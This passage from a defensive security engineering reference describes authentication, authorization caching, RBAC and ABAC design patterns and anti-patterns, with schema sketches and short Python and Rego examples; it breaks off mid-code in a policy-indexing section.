## Authentication Patterns

### Token-Based Authentication

**JWT (JSON Web Tokens)**

Structure consists of header, payload, and signature segments. Critical implementation considerations include algorithm confusion attacks—always explicitly validate `alg` header against a whitelist, never accept `none`. Store signing keys in HSMs or secure vaults, never hardcode. Implement token rotation with short-lived access tokens (5-15 minutes) paired with longer-lived refresh tokens stored in httpOnly, secure, SameSite cookies.

**Stateless vs Stateful Tokens**

Stateless JWTs cannot be invalidated server-side without maintaining a blocklist, negating statelessness benefits. For high-security contexts, use stateful tokens with server-side session stores (Redis, database) enabling immediate revocation. Hybrid approaches store minimal claims in JWT while referencing server-side session for critical state.

**Token Storage**

Never store tokens in localStorage due to XSS vulnerability. Acceptable options: httpOnly cookies (immune to XSS, vulnerable to CSRF—mitigate with SameSite=Strict/Lax and CSRF tokens), memory (lost on refresh), or SessionStorage (better than localStorage, still XSS-vulnerable). For mobile, use secure platform keystores (iOS Keychain, Android KeyStore).

### OAuth 2.0 and OIDC

**Authorization Code Flow with PKCE**

PKCE (Proof Key for Code Exchange) is mandatory for public clients and recommended for confidential clients. Generate cryptographically random code_verifier (43-128 characters), compute code_challenge using S256 (SHA-256 hash, base64url-encoded). Never use `plain` method in production. Validate state parameter to prevent CSRF on callback.

**Token Endpoint Security**

Implement client authentication via client_secret_post, client_secret_basic, or preferably private_key_jwt/client_secret_jwt for confidential clients. Rate-limit token endpoints aggressively (10 requests/minute per client). Validate redirect_uri against pre-registered exact matches or strict prefix patterns—never use wildcard matching.

**Refresh Token Rotation**

Implement refresh token rotation: issue new refresh token with each refresh request, invalidate old token immediately. Detect refresh token reuse as indicator of compromise—revoke entire token family. Set absolute expiration on refresh token chains (e.g., 30 days) regardless of rotation.

### Multi-Factor Authentication

**TOTP (Time-Based One-Time Password)**

Follow RFC 6238. Use 6-8 digit codes, 30-second time steps, SHA-256 or SHA-512 hashing. Implement time drift tolerance (±1 time step), but track and alert on consistent drift patterns indicating potential clock synchronization attacks. Store shared secrets encrypted at rest, never in plaintext.

**WebAuthn/FIDO2**

Implement passwordless authentication using WebAuthn for phishing-resistant MFA. Validate authenticator attestation statements when required. Store credential IDs and public keys server-side. Implement user verification (UV) flag checking for high-security operations. Support both platform authenticators (biometrics) and roaming authenticators (security keys).

**Backup Codes**

Generate cryptographically secure backup codes (16+ characters, high entropy). Hash before storage using bcrypt/Argon2. Limit count (typically 10), single-use only. Implement separate rate limiting for backup code attempts. Require re-generation after use or time expiration.

### Session Management

**Session Fixation Prevention**

Regenerate session ID immediately after authentication state change (login, privilege escalation). Never accept session IDs from URL parameters or POST bodies—only from cookies. Implement session ID entropy requirements (minimum 128 bits from CSPRNG).

**Session Timeout Strategies**

Implement both idle timeout (15-30 minutes inactivity) and absolute timeout (8-24 hours from creation). Use sliding window for idle timeout—extend on activity but cap at absolute maximum. For high-security operations, require re-authentication regardless of session validity.

**Concurrent Session Controls**

Implement device fingerprinting (User-Agent, IP, TLS fingerprint) without relying on it for security decisions. Maintain active session registry per user. Enforce maximum concurrent sessions (typically 3-5). Provide user interface for session management and remote logout.

### Password Authentication

**Hashing Algorithms**

Use Argon2id as first choice (memory-hard, ASIC-resistant), bcrypt as fallback (work factor 12-14), or scrypt. Never use MD5, SHA-1, SHA-256 alone. Configure iteration counts based on acceptable authentication latency (target 500ms-1s). Implement adaptive cost factors—increase over time as hardware improves.

**Pepper and Salting**

Use cryptographically random, unique salt per password (minimum 16 bytes). Store salt alongside hash. Implement application-level pepper (secret key not stored with hash, stored in configuration/vault) for defense-in-depth against database compromise. Rotate pepper requires password rehashing.

**Password Policy Anti-Patterns**

Avoid arbitrary composition requirements (uppercase, lowercase, number, special character)—proven to reduce entropy by encouraging predictable patterns. Implement minimum length only (12-16 characters). Check against breached password databases (HaveIBeenPwned API using k-anonymity). Block common passwords and user-specific tokens (username, email local-part).

### API Authentication

**API Key Management**

Prefix API keys with identifiable prefix for detection in logs/repos. Generate keys with high entropy (32+ bytes, base64url-encoded). Implement key rotation policies (90-180 days). Support multiple concurrent keys during rotation. Hash keys before storage (SHA-256 minimum). Implement separate rate limits per key.

**mTLS (Mutual TLS)**

Implement bidirectional certificate verification for machine-to-machine authentication. Validate entire certificate chain, check revocation status (OCSP/CRL), verify Subject Alternative Names or Common Name against expected values. Implement certificate pinning for critical services. Automate certificate rotation before expiration.

**HMAC Request Signing**

Sign requests using HMAC-SHA256 with shared secret. Include timestamp to prevent replay attacks (reject requests older than 5 minutes). Sign canonical representation: HTTP method, path, sorted query parameters, headers subset, body hash. Include signature in Authorization header. Implement signature version for algorithm changes.

### Biometric Authentication

**Local vs Server-Side Verification**

Biometric data should never leave device—use platform APIs (Face ID, Touch ID, Windows Hello) returning success/failure only. Server receives cryptographic proof of local biometric verification, not biometric data itself. Implement fallback authentication for biometric failures.

**Liveness Detection**

For facial recognition, implement liveness detection (challenge-response, motion detection, depth sensing) to prevent photo/video replay attacks. For fingerprint, require capacitive sensors detecting conductivity. Never rely solely on client-side liveness checks.

### Account Recovery

**Security Questions Anti-Pattern**

Avoid security questions—answers often publicly discoverable or low-entropy. If required by compliance, treat answers as supplementary, never sole recovery factor. Hash answers, implement rate limiting.

**Email-Based Recovery**

Generate cryptographically secure, single-use recovery tokens (256 bits). Set short expiration (1-24 hours). Invalidate on successful use or password change. Send to verified email only. Implement separate rate limiting for recovery requests. Include account activity context in recovery email for user verification.

**Recovery Code System**

Issue time-limited recovery codes during account setup or security settings changes. Require proof of identity before issuance (existing authentication, support verification). Implement abuse detection—flag accounts with excessive recovery attempts. Store recovery codes hashed with same rigor as passwords.

### Anti-Patterns

**Username Enumeration**

Identical responses for "user not found" vs "invalid password" to prevent username harvesting. Implement timing attack mitigation—ensure constant-time comparison and consistent response times regardless of failure reason.

**Credential Stuffing Defense**

Implement rate limiting per IP, per username, global. Use progressive delays, temporary account locks after threshold. Deploy CAPTCHA after N failed attempts. Monitor for distributed attacks across IP ranges. Integrate breach detection services.

**Insecure Direct Object References**

Never expose internal user IDs in URLs, tokens, or APIs. Use UUIDs or encrypted/signed references. Implement authorization checks on every resource access regardless of reference format.

**Related Topics:** Zero Trust Architecture, Certificate-based Authentication, Risk-based Authentication, Passwordless Authentication Flows, Token Introspection Patterns, Session Fixation Attacks, Authentication Bypass Vulnerabilities

---

## Authorization Patterns

### Token-Based Authorization

**JWT (JSON Web Tokens)**

Store claims directly in the token payload. Signature verification eliminates database lookups for basic authentication but requires careful handling of token invalidation. Use short-lived access tokens (5-15 minutes) paired with longer-lived refresh tokens (days to weeks) stored securely with rotation on each use.

**Stateless Claims Validation**

Embed role/permission data in tokens to avoid authorization queries. Trade-off: stale permissions until token expiry. Mitigate with version claims (`permissions_version`) and server-side validation caching keyed by version. Force re-authentication when permission sets change by incrementing the version.

**Opaque Tokens (Reference Tokens)**

Store authorization context server-side, token acts as lookup key. Enables instant revocation and permission updates. Critical for high-security contexts where immediate invalidation is non-negotiable. Redis/Memcached stores with TTL matching session lifetime provide O(1) lookups.

### Role-Based Access Control (RBAC)

**Role Hierarchies**

Implement transitive role inheritance: `Admin > Manager > User`. Pre-compute flattened permission sets at role assignment rather than tree traversal at authorization time. Store as bitmasks or arrays for constant-time permission checks.

**Permission Explosion**

Avoid granular per-resource permissions (e.g., `document:123:read`). Scale to thousands of resources renders permission checks infeasible. Use attribute-based filtering post-authorization or resource-level ACLs as separate layer.

**Dynamic Role Assignment**

Cache user-role mappings with event-based invalidation. Propagate role changes through message queues to distributed authorization services. Avoid polling; use WebSocket/SSE for real-time permission updates to active sessions.

### Attribute-Based Access Control (ABAC)

**Policy Evaluation Engines**

Centralize policy logic in dedicated services (Open Policy Agent, AWS Cedar). Policies as code enable versioning, testing, and audit trails. Cache evaluation results with cache keys incorporating all relevant attributes: `user_id:resource_type:action:context_hash`.

**Context Attributes**

Include time, location, IP ranges, device trust level, resource sensitivity classification. Policies evaluate boolean expressions: `(user.department == resource.owner.department) AND (time.hour >= 9 AND time.hour <= 17)`.

**Performance Considerations**

Policy evaluation latency compounds with complexity. Pre-compile policies to decision trees or lookup tables where possible. For dynamic policies, implement tiered caching: compiled policy cache (minutes) and evaluation result cache (seconds to minutes based on attribute volatility).

### Hierarchical Authorization

**Resource Ownership Chains**

Model parent-child relationships: `Organization > Project > Document`. Inherit permissions downward; explicit denials override inheritance. Query optimization: materialized path columns or closure tables for efficient ancestor lookups without recursive CTEs.

**Scope Isolation**

Enforce tenant boundaries at query level with mandatory WHERE clauses. Use database-level row security policies (Postgres RLS) as defense-in-depth. Application-layer checks fail open; database-layer enforcement prevents data leakage from ORM misconfiguration or SQL injection.

### Authorization Decision Caching

**Cache Key Design**

Structure: `auth:v{version}:{user_id}:{resource_type}:{action}:{context_hash}`. Version prefix enables global cache invalidation. Context hash covers IP, time window, device fingerprint—balance cache hit rate against security freshness requirements.

**Negative Caching**

Cache authorization denials separately with shorter TTL (30-60 seconds). Prevents authorization service overload from repeated unauthorized access attempts. Monitor negative cache hit rates for potential attack patterns.

**Cache Invalidation Strategies**

- **Time-based expiry**: 5-15 minutes for standard operations, 30-60 seconds for sensitive actions
- **Event-driven**: Invalidate on permission/role changes via pub/sub
- **Write-through**: Update cache synchronously during authorization changes, accept occasional stale reads
- **Cache-aside with versioning**: Increment permission version, cache keys auto-invalidate on version mismatch

**Distributed Cache Coherence**

Use Redis Cluster with hash tags to co-locate user authorization data: `{user:123}:permissions`. Reduces cross-node lookups. Implement Bloom filters for non-existent permission checks before cache/database queries.

### Multi-Tenant Authorization

**Tenant Context Propagation**

Extract tenant ID from subdomain, JWT claim, or API key. Inject into thread-local storage/request context at ingress boundary. All downstream queries implicitly filter by tenant without explicit parameter passing.

**Shared vs. Isolated Schemas**

- **Shared schema**: Single database, tenant_id discriminator. Requires bulletproof query filtering; one missing WHERE clause leaks cross-tenant data. Use prepared statements with bound parameters only.
- **Schema-per-tenant**: Isolation at database/schema level. Authorization simplified to connection-level access control. Higher operational overhead; connection pooling per tenant.

**Caching Boundaries**

Namespace caches by tenant: `tenant:{tenant_id}:auth:{user_id}:{resource}`. Prevents cache key collisions and simplifies per-tenant cache eviction during offboarding or compliance requirements (GDPR deletion).

### Anti-Patterns

**Authorization in UI Only**

Client-side permission checks are presentation logic, not security controls. Always enforce authorization server-side at API/service boundary. UI-level checks prevent UI clutter; backend checks prevent exploitation.

**Overly Generic Roles**

Roles like "power_user" or "advanced" lack semantic meaning. Define roles by business function: `billing_admin`, `content_moderator`. Prevents permission creep and simplifies audit/compliance reviews.

**Hard-Coded Permission Checks**

`if (user.role === 'admin')` scattered throughout codebase. Extract to authorization service/library. Centralization enables consistent enforcement, policy updates without code deployment, and comprehensive audit logging.

**Ignoring Authorization Failures**

Silent authorization failures (logging but continuing) or generic errors hide attack attempts. Return 403 Forbidden with minimal detail to user; log detailed context (user, resource, action, timestamp, trace ID) for security monitoring.

**Cache Stampede on Invalidation**

Global cache flush causes thundering herd on authorization service. Implement jittered expiry (TTL ± random offset), request coalescing (single in-flight authorization check per cache key), or stale-while-revalidate pattern.

### Caching Patterns Specific to Authorization

**Permission Expansion Caching**

Pre-compute transitive permissions for roles/groups at assignment time. Cache flattened permission sets: `user:123:permissions -> [read:documents, write:comments, admin:settings]`. Eliminates runtime graph traversal.

**Policy Decision Caching**

Cache ABAC policy evaluation results keyed by normalized policy input. Same user+resource+action+context yields cache hit. TTL based on attribute volatility: static attributes (user department) longer TTL than dynamic (time of day).

**Hierarchical Invalidation**

Invalidate authorization caches top-down: organization permissions change → invalidate all child projects/documents. Tag cache entries with hierarchy levels; use cache tag-based invalidation (Redis tags, Memcached namespaces).

**Probabilistic Data Structures**

Implement Bloom filters for "definitely unauthorized" fast path. If Bloom filter indicates permission absent, skip cache/DB lookup and return 403 immediately. False positive rate tuned to authorization traffic patterns—minimize expensive negative lookups.

**Read-Through Authorization Cache**

On cache miss, authorization service queries DB and populates cache before returning decision. Single code path ensures cache always reflects DB state. Race conditions handled by cache set-if-not-exists semantics.

**Two-Tier Cache Architecture**

- **L1 (application memory)**: Sub-millisecond, limited capacity, per-instance
- **L2 (distributed cache)**: Single-digit milliseconds, shared across instances, larger capacity

Popular permissions cached in L1, long-tail in L2. Cache promotion based on access frequency.

**Circuit Breaker for Authorization Service**

When authorization service fails or times out, implement fallback strategies:

- **Fail closed**: Deny all requests (default for sensitive operations)
- **Fail open with logging**: Allow based on cached/default permissions, log for audit (acceptable for read-only, non-sensitive operations)
- **Degraded mode**: Allow based on stale cache data with extended TTL, mark sessions for re-authorization

**Related Topics**

Authentication patterns, API gateway authorization, OAuth2/OIDC implementation, zero-trust architecture, service mesh authorization (Istio, Linkerd), policy-as-code frameworks, authorization audit logging, threat modeling for authorization bypasses

---

## Role-Based Access Control

### Core RBAC Model Components

**Users**: Entities requiring access. Map to identity providers (LDAP, OAuth, SAML). Maintain minimal user attributes in RBAC system; retrieve extended profiles from authoritative sources.

**Roles**: Named collections of permissions. Design roles around job functions, not individuals. Typical cardinality: 20-200 roles for enterprise applications.

**Permissions**: Granular access rights to resources and operations. Format: `resource:action` (e.g., `invoice:read`, `user:delete`). Avoid boolean permission flags; use structured permission objects with context.

**Sessions**: Runtime binding of users to activated role subset. Support role activation/deactivation within session without re-authentication.

### Hierarchical RBAC (Role Inheritance)

Roles inherit permissions from parent roles. Directed acyclic graph (DAG) structure prevents circular inheritance.

**Implementation Considerations:**

- **Depth limits**: Restrict inheritance depth to 3-5 levels. Deeper hierarchies create cognitive overhead and performance degradation.
- **Permission resolution**: Traverse inheritance graph using breadth-first search. Cache computed permission sets per role to avoid repeated traversal.
- **Conflicting permissions**: Explicit deny overrides inherited allow. Use priority ordering when multiple inheritance paths exist.
- **Materialized views**: Precompute transitive closure of role hierarchies. Store flattened permission sets for O(1) lookup at runtime.
- **Graph validation**: Detect cycles during role modification using topological sort. Reject changes creating cycles.

**Anti-patterns:**

- Deep inheritance chains (>5 levels) mimicking organizational structure
- Diamond inheritance without explicit conflict resolution rules
- Mutating parent roles without invalidating child role permission caches

### Constrained RBAC Extensions

**Static Separation of Duty (SSD)**: Mutually exclusive role assignments. User cannot be assigned conflicting roles simultaneously.

- **Conflict sets**: Define role pairs/groups that cannot coexist (e.g., `accountant` and `auditor`).
- **Enforcement point**: Validate during role assignment operation. Reject assignment if creates SSD violation.
- **Cardinality constraints**: Limit maximum users per role or minimum users for critical roles.

**Dynamic Separation of Duty (DSD)**: Mutually exclusive role activations within sessions. User may possess conflicting roles but cannot activate simultaneously.

- **Activation limits**: Restrict number of concurrently active roles per session (typically 1-3).
- **Temporal constraints**: Time-bound role activations. Auto-deactivate after inactivity threshold or absolute timeout.
- **Transaction-scoped activation**: Activate roles only for duration of specific operations, then immediately deactivate.

**Prerequisite Roles**: Roles requiring other roles as prerequisites (e.g., `senior_developer` requires `developer`).

- **Transitive prerequisites**: Compute full prerequisite chain. Assigning role implicitly grants prerequisite roles.
- **Ordering constraints**: Enforce assignment sequence. Prevent assigning advanced role before foundational roles.

### Permission Design Patterns

**Resource-Action Tuples**: Structure permissions as `(resource_type, resource_id, action)`.

- **Wildcard support**: Allow `invoice:*:read` (all invoices) or `*:123:read` (all actions on resource 123). Implement wildcard expansion at authorization time.
- **Attribute-based refinement**: Embed resource attributes in permission checks: `invoice:read WHERE department='sales'`.
- **Hierarchical resources**: Support resource hierarchies (`organization/department/team`). Permission on parent implicitly grants permission on children.

**Negative Permissions**: Explicit deny statements override allows.

- **Precedence**: Evaluate denies before allows. Single deny blocks access regardless of allow count.
- **Use sparingly**: Overuse creates permission conflict complexity. Reserve for exceptional access revocation scenarios.

**Conditional Permissions**: Context-dependent permission evaluation.

- **Time-based**: Activate permissions during business hours or maintenance windows.
- **Location-based**: Restrict permissions by IP range, geographic region, or network segment.
- **Request-based**: Evaluate based on request attributes (HTTP method, user agent, originating service).

### Role Assignment Strategies

**Direct Assignment**: Explicitly assign roles to users. Simple but scales poorly (O(users × roles) relationships).

**Group-Based Assignment**: Assign roles to groups; users inherit roles from group membership. Reduces assignment cardinality to O(users × groups + groups × roles).

- **Group providers**: Integrate with directory services (Active Directory, LDAP). Synchronize group memberships on schedule or trigger-based.
- **Multiple group membership**: User belongs to multiple groups accumulating roles. Implement union semantics for role aggregation.
- **Dynamic groups**: Define groups using predicates over user attributes (e.g., all users where `department='engineering'`). Re-evaluate membership on attribute changes.

**Attribute-Based Assignment**: Derive role assignments from user attributes without explicit assignment records.

- **Assignment policies**: Express as rules (`IF user.level >= 5 THEN assign 'senior_engineer'`). Evaluate policies during session establishment.
- **Policy engine integration**: Use dedicated policy engines (OPA, Cedar) for complex assignment logic.
- **Audit challenges**: No explicit assignment records. Generate synthetic audit trail showing computed assignments and triggering attributes.

### Authorization Decision Flow

1. **Authentication**: Verify user identity. Obtain user identifier and authentication claims.
2. **Session establishment**: Retrieve assigned roles from assignment store. Activate default role subset based on context.
3. **Permission resolution**: Expand roles into permission sets. Apply inheritance, constraints, and conditional logic.
4. **Authorization check**: Evaluate requested action against resolved permissions. Return allow/deny decision.
5. **Decision caching**: Cache authorization decisions with TTL (30-300 seconds). Invalidate on role/permission modifications.

**Optimization techniques**:

- **Permission bitmap indices**: Encode permissions as bit vectors for fast bitwise operations.
- **Bloom filters**: Probabilistic negative checks. Quickly eliminate impossible permissions before expensive exact checks.
- **Lazy evaluation**: Resolve only permissions relevant to current request. Avoid computing full permission set on every request.

### RBAC Data Model Schema Design

**Normalized schema**:

```
users (user_id PK, external_id, attributes JSONB)
roles (role_id PK, role_name UNIQUE, parent_role_id FK, metadata JSONB)
permissions (permission_id PK, resource_type, action, constraints JSONB)
role_permissions (role_id FK, permission_id FK, PK(role_id, permission_id))
user_roles (user_id FK, role_id FK, granted_at, granted_by, expires_at, PK(user_id, role_id))
```

**Denormalized schema** (read-optimized):

```
user_effective_permissions (user_id FK, permission_id FK, computed_at, PK(user_id, permission_id))
role_transitive_permissions (role_id FK, permission_id FK, depth INT, PK(role_id, permission_id))
```

**Index strategies**:

- B-tree index on `user_roles.user_id` for role lookup
- Hash index on `role_permissions.role_id` for permission retrieval
- Covering index on `(user_id, role_id, expires_at)` for session queries
- Partial index on `user_roles WHERE expires_at IS NOT NULL` for temporal role queries

**Partitioning**:

- Partition `user_roles` by user_id hash for horizontal scaling
- Partition `role_permissions` by role_id range for skewed role sizes
- Archive expired `user_roles` to separate cold storage table

### Temporal RBAC (Time-Based Constraints)

**Scheduled role activation**: Roles activate/deactivate based on calendar schedule.

- **Cron expressions**: Define activation windows using cron syntax or interval specifications.
- **Timezone handling**: Store schedules in UTC. Convert to user timezone for display only.
- **Holiday calendars**: Integrate business calendar systems. Suppress activations on holidays/weekends.

**Ephemeral roles**: Time-limited role assignments auto-expire without explicit revocation.

- **Use cases**: Break-glass access, temporary privilege escalation, contractor access.
- **Expiration checking**: Evaluate expiration on every authorization check or asynchronously via scheduled jobs.
- **Grace periods**: Warn users N minutes before expiration. Optionally extend expiration via approval workflow.

**Activation windows**: Roles require explicit activation within validity window.

- **Just-in-time access**: User requests role activation. Approval workflow grants time-bound activation token.
- **Maximum activation duration**: Enforce upper limit (typically 1-8 hours). Require re-activation after expiration.

### Audit and Compliance

**Role assignment audit trail**:

- Record: user_id, role_id, action (grant/revoke), timestamp, granted_by, justification, approval_ticket_id
- Immutable append-only log. Never delete audit records; mark as archived.
- Searchable by user, role, time range, granter. Support compliance queries (who granted what to whom when).

**Permission usage tracking**:

- Log every authorization decision: user_id, requested_permission, decision (allow/deny), timestamp, session_id, request_context
- Sample logging for high-volume permissions (e.g., log 1% of read operations, 100% of write operations).
- Aggregate into analytics tables for access pattern analysis and anomaly detection.

**Privileged access monitoring**:

- Flag sensitive permissions (e.g., user_delete, config_modify, audit_log_read). Log all uses with full context.
- Real-time alerting on sensitive permission usage outside normal patterns.
- Video session recording for highest-privilege roles (database admin, infrastructure admin).

**Compliance reporting**:

- Periodic access reviews: Generate reports of user-role assignments for manager review. Auto-revoke unconfirmed assignments.
- Segregation of duty violations: Detect and report SSD/DSD constraint violations.
- Orphaned accounts: Identify users with role assignments but no recent authentication.
- Over-privileged accounts: Flag users with roles exceeding typical peer access levels.

### Role Explosion Prevention

**Problem**: Uncontrolled role proliferation creates management overhead. Organizations accumulate hundreds of narrowly-defined roles.

**Mitigation strategies**:

- **Role consolidation**: Merge similar roles differing in minor permissions. Use attribute-based constraints for differentiation.
- **Parameterized roles**: Single role with parameters instead of multiple variants (e.g., `regional_manager(region='US-WEST')` vs. separate `us_west_manager` role).
- **Permission bundling review**: Periodically analyze permission co-occurrence. Bundle frequently co-assigned permissions into new roles.
- **Role lifecycle management**: Archive unused roles (no assignments for 180+ days). Require justification for reactivation.
- **Permission-based authorization**: For highly dynamic requirements, shift from RBAC to pure attribute-based or policy-based access control.

### Multi-Tenancy Considerations

**Tenant isolation**: Roles and permissions scoped per tenant. Users in tenant A cannot access tenant B resources.

- **Tenant-scoped role names**: Prefix roles with tenant identifier (`tenant123_admin`). Simplifies cross-tenant role management.
- **Shared role definitions**: Define role templates centrally. Instantiate per tenant with tenant-specific resource bindings.
- **Cross-tenant roles**: Super-admin or support roles with multi-tenant access. Use strict approval workflows and session recording.

**Tenant delegation**: Parent tenants delegate role administration to child tenants.

- **Delegation constraints**: Parent defines allowed role/permission boundaries. Children cannot exceed delegated authority.
- **Hierarchical tenancy**: Permissions flow down tenant hierarchy. Parent admin can access all child tenant resources.

### RBAC Implementation Patterns

**Centralized authorization service**: Dedicated service handles all authorization decisions. Applications query service via RPC/REST.

- **Advantages**: Consistent policy enforcement, centralized audit, simplified policy updates.
- **Disadvantages**: Network dependency, latency overhead (2-10ms per check), availability risk.
- **Optimization**: Client-side caching of authorization decisions with short TTL (30-60 seconds).

**Embedded authorization**: Authorization logic embedded in application as library or sidecar proxy.

- **Advantages**: Zero network latency, no external dependency, works offline.
- **Disadvantages**: Policy updates require application redeployment or configuration refresh, distributed audit collection.
- **Implementation**: Bundle RBAC data and policy engine as library. Periodically sync from central policy repository.

**Gateway-based authorization**: API gateway evaluates authorization before routing to backend services.

- **Advantages**: Centralized enforcement point, offloads authorization from application logic.
- **Disadvantages**: Coarse-grained checks only (URL-level), insufficient for fine-grained data-level authorization.
- **Hybrid approach**: Gateway enforces coarse permissions, applications enforce fine-grained checks.

### Permission Checking Anti-patterns

- Checking permissions in presentation layer instead of business logic layer (bypassable via API)
- Hardcoding role names in application code instead of checking permissions
- Implicit permission assumptions without explicit checks (e.g., "users with this role always have X permission")
- No permission checks on read operations (only checking writes)
- Checking permissions after performing operation instead of before
- Returning different error codes for "permission denied" vs. "resource not found" (information leakage)
- Missing permission checks on bulk operations or batch APIs
- Permission checks with race conditions (TOCTOU: time-of-check-time-of-use)
- No permission checks on internal APIs (assuming trusted caller)
- Caching authorization decisions indefinitely without invalidation mechanism

### Performance Optimization

**Permission check batching**: Single RPC call to check multiple permissions simultaneously.

- **Request format**: `check_permissions(user_id, [(resource1, action1), (resource2, action2), ...])`.
- **Response format**: Array of boolean results matching request order.
- **Reduces latency**: 10 sequential checks at 5ms each = 50ms. Single batched check = 5ms.

**Session-scoped permission caching**: Materialize user's full permission set at session start. Store in session state or client-side JWT.

- **Cache invalidation**: Require re-authentication after role/permission changes. Or push invalidation messages via WebSocket/SSE.
- **JWT approach**: Embed permissions in signed JWT. Validate signature on each request. No external authorization service call.
- **Size constraints**: JWT size limit ~8KB. Encode permissions efficiently (bit vectors, Bloom filters).

**Database query optimization**:

- Use recursive CTEs for role hierarchy traversal instead of application-level recursion
- Materialize permission sets as database views for complex inheritance
- Partition large user_roles tables by user_id for faster lookups
- Use database-level caching (PostgreSQL shared_buffers, MySQL query cache)

### Migration Strategies

**From hardcoded authorization**:

1. Extract existing permission checks into centralized permission definition catalog
2. Replace boolean flags with structured permission checks
3. Introduce roles incrementally, initially with 1:1 user-role mapping
4. Consolidate roles by identifying common permission patterns
5. Migrate user-permission assignments to user-role assignments

**From ACL-based systems**:

1. Analyze ACL usage patterns to identify implicit roles
2. Define roles matching identified patterns
3. Migrate users with identical ACLs to shared roles
4. Convert resource-specific ACLs to role-based permissions with resource scoping
5. Retain ACL system temporarily for edge cases not covered by RBAC

**From ABAC systems**: RBAC and ABAC are complementary, not mutually exclusive. Retain ABAC for dynamic policies while using RBAC for static, coarse-grained access.

### Testing Strategies

**Permission matrix testing**: Generate matrix of (roles × permissions). Verify each cell matches expected allow/deny.

**Constraint validation testing**: Verify SSD/DSD constraints prevent invalid role combinations. Test activation limits and prerequisite enforcement.

**Inheritance testing**: Verify child roles inherit parent permissions correctly. Test conflict resolution in multiple inheritance scenarios.

**Negative testing**: Verify users without roles are denied all access. Test permission checks with invalid role IDs, expired sessions, malformed requests.

**Performance testing**: Load test authorization service with realistic query patterns. Verify latency SLAs under peak load. Test cache effectiveness and invalidation correctness.

**Audit completeness testing**: Verify all authorization decisions generate audit events. Test audit trail immutability and searchability.

### Security Considerations

**Privilege escalation prevention**:

- Role administrators cannot assign roles with permissions exceeding their own
- Require separate privileged role for role/permission management
- Audit all role administration operations with mandatory approval workflows

**Session fixation**: Regenerate session IDs after role activation/deactivation. Invalidate old session tokens.

**Token revocation**: Implement token revocation registry for compromised credentials. Check registry on every authorization request or cache with short TTL.

**Cryptographic role bindings**: Sign role assignments with private key. Verify signature before trusting assignment. Prevents tampering with role data in transit.

**Rate limiting**: Enforce rate limits on authorization checks per user/IP to prevent enumeration attacks probing permissions.

**Information disclosure**: Return generic "access denied" messages without revealing existence of resources or specific missing permissions.

### Anti-patterns Summary

- Roles per individual user (defeats purpose of RBAC)
- Embedding user identities in role definitions
- No role hierarchy when clear organizational structure exists
- Storing permissions in application code instead of centralized store
- No distinction between role assignment and role activation
- Ignoring temporal aspects (expired assignments remain active)
- No audit trail for role/permission changes
- Permission checks only in UI layer
- Roles without clear business purpose or ownership
- No periodic access reviews or role cleanup
- Over-granular permissions creating unmanageable complexity
- Missing permission checks on "read" operations
- Synchronous external authorization service calls without caching or fallback

**Related topics**: Attribute-based access control (ABAC), policy-based access control (PBAC), OAuth 2.0 scope mapping to RBAC roles, SAML attribute-based role assignment, zero-trust architecture authorization patterns, permission boundary policies, cross-account role assumption patterns.

---

## Attribute-Based Access Control

ABAC evaluates access decisions based on attributes of subjects, resources, actions, and environmental context through policy evaluation engines. Unlike RBAC's static role assignments, ABAC enables dynamic, fine-grained authorization at scale but introduces policy complexity and performance challenges.

### Core Components

**Policy Decision Point (PDP)** evaluates authorization requests against policies. **Policy Enforcement Point (PEP)** intercepts access attempts and queries PDP. **Policy Administration Point (PAP)** manages policy lifecycle. **Policy Information Point (PIP)** provides attribute data to PDP.

Critical architectural constraint: **PDP must remain stateless** for horizontal scaling. All context required for decision must be provided in request or retrievable from PIP.

```python
# Anti-pattern: Stateful PDP with session tracking
class PolicyDecisionPoint:
    def __init__(self):
        self.user_sessions = {}  # Breaks horizontal scaling
    
    def authorize(self, user_id, resource, action):
        session = self.user_sessions.get(user_id)
        return self.evaluate_with_session(session, resource, action)

# Correct: Stateless PDP with explicit context
class PolicyDecisionPoint:
    def authorize(self, subject_attrs, resource_attrs, action, environment):
        policy = self.policy_store.get_applicable_policies(resource_attrs)
        return self.evaluate(policy, subject_attrs, resource_attrs, action, environment)
```

### Attribute Categories

**Subject attributes**: Identity, roles, clearance level, department, employment status, authentication method, device trust level.

**Resource attributes**: Classification, owner, creation date, data sensitivity, geographic location, resource type.

**Action attributes**: Operation type (read/write/delete), API endpoint, transaction amount, batch vs. interactive.

**Environment attributes**: Time of day, source IP, network zone, threat level, system load, compliance period.

**Attribute staleness**: Cached attributes may become stale. Requires **attribute TTL** and **just-in-time retrieval** for critical attributes (employment status, account suspension).

```python
# Pattern: Attribute retrieval with staleness control
class AttributeProvider:
    def get_subject_attributes(self, subject_id, required_freshness=None):
        cached = self.cache.get(f"subject:{subject_id}")
        
        if cached and required_freshness:
            age = time.time() - cached['timestamp']
            if age > required_freshness:
                cached = None
        
        if not cached:
            cached = {
                'attributes': self.identity_provider.fetch(subject_id),
                'timestamp': time.time()
            }
            self.cache.set(f"subject:{subject_id}", cached, ttl=300)
        
        return cached['attributes']
```

### Policy Languages

**XACML (eXtensible Access Control Markup Language)** provides standardized XML-based policy expression with combining algorithms. Verbose and difficult to author/maintain at scale.

**ALFA (Abbreviated Language For Authorization)** offers human-readable XACML alternative with stronger typing.

**Rego (Open Policy Agent)** uses declarative logic programming for policy-as-code with version control integration.

**Cedar (AWS)** provides schema-validated policies with formal verification capabilities.

Critical evaluation: **Policy language expressiveness vs. decidability tradeoff**. Turing-complete languages enable arbitrary logic but introduce non-termination risks and performance unpredictability.

```rego
# Rego policy example with attribute conditions
package authz

default allow = false

allow {
    input.subject.clearance_level >= input.resource.classification
    input.subject.department == input.resource.owner_department
    valid_time_window
}

valid_time_window {
    hour := time.clock([time.now_ns(), "America/New_York"])[0]
    hour >= 9
    hour < 17
}
```

### Policy Evaluation Models

**Deny-overrides**: Explicit deny takes precedence over permits. Conservative for security-critical systems but creates deny-by-default friction.

**Permit-overrides**: Explicit permit takes precedence. Risky default requiring careful policy auditing.

**First-applicable**: First matching policy determines outcome. Policy ordering becomes critical; brittle under policy additions.

**Only-one-applicable**: Error if multiple policies match. Forces explicit conflict resolution but increases policy maintenance burden.

**Deny-unless-permit**: Explicit permit required; absence treated as deny. Standard security posture for least-privilege systems.

### Policy Indexing and Optimization

Naive policy evaluation iterates all policies per request. **O(n)** complexity per request becomes bottleneck at scale.

**Policy indexing strategies**:

**Attribute-based indexing**: Build inverted index mapping attribute values to applicable policies. Query: "policies applicable when subject.department=Engineering".

```python
# Pattern: Policy indexing for fast retrieval
class PolicyIndex:
    def __init__(self):
        self.resource_type_index = defaultdict(set)
        self.action_index = defaultdict(set)
